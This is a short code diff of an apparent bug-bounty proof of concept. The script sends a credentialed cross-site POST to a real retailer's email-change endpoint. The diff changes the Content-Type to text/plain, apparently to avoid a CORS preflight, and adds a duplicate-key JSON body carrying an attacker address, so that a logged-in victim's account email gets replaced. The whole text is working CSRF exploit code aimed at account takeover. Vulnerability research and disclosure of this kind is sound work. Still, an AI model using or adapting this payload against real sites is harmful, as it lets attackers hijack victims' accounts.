@@ -14,11 +14,11 @@
         fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'text/plain',
                 'X-Requested-With': 'XMLHttpRequest'
             },
-            credentials: 'include', // Include cookies
-            body: JSON.stringify({ email: 'attacker+extratest3@wearehackerone.com' })
+            credentials: 'include',
+            body: '{"email":"=", "email":"attacker+extratest5@wearehackerone.com"}'
         })
             .then(response => response.json())
             .then(data => console.log('Success:', data))
